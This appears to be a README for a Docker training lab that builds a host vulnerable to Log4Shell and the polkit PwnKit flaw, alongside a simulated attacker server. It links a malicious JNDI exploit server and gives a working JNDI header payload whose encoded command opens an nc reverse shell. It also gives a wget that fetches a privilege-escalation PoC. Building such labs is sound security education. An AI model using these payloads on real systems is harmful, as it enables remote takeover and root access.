#  log4j CVE-2021-44228 + polkit CVE-2021-4034
Vulnerable instance for the log4j apache exploit and privilege escalation using polkit
- The vulnable spring-boot-application.jar was extracted from [this docker image](https://hub.docker.com/r/andylibrian/log4shell-vulnerable-app/tags)
- The malicious JNDI server was downloaded from [here](https://log4j-knox.s3.amazonaws.com/JNDIExploit-1.2-SNAPSHOT.jar) and referenced in [this article](https://github.com/kubearmor/log4j-CVE-2021-44228).

## creating the vulnerable instances
> Note: the Dockerfiles require certain versions of the vulnerable applications to be present within the ubuntu repositories. If these get updated and/or removed on any given time the docker image will fail to build. To solve this an image will be uploaded to the docker hub and linked here.

### log4j-polkit-vuln
The vulnerable instance will be running and listening for connections on port 80 (exposed to the host machine) on completion of the steps below. The vulnerable part for the log4j exploit is the X-Api-Version header that is sent to the server.

steps to create a vulnerable instance for log4j + polkit:
1. cd log4j-polkit-vuln
2. docker build -t log4j-polkit-vuln .
3. docker run -p 80:8080 --hostname victim log4j-polkit-vuln

### attackserver
This will simulate the attackers machine, in this case present within the same network (due to easy communication between docker containers), but the exploit works no matter where this attack server is situated (only condition is that it is accessible by the victim). The malicious JNDI server will be hosted on here and create a malicious class to execute arbitrary commands on the victims machine.

steps to create a simulated attacker machine:
1. cd attackserver
2. docker build -t attackserver .
3. docker run -it --hostname attackserver attackserver /bin/bash
4. java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ip> -p 8888 & # create malicious JNDI server

## exploitation
commands from the poc-video
> Note: IP address of the attackserver might vary
```
# Log4j exploit
curl http://localhost -H 'X-Api-Version: ${jndi:ldap://172.17.0.3:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMyA0NDQ0IC1lIC9iaW4vYmFzaA==}'

# Polkit exploit
wget https://raw.githubusercontent.com/afwu/CVE-2021-4035/main/cve-2021-4034-poc.c

```
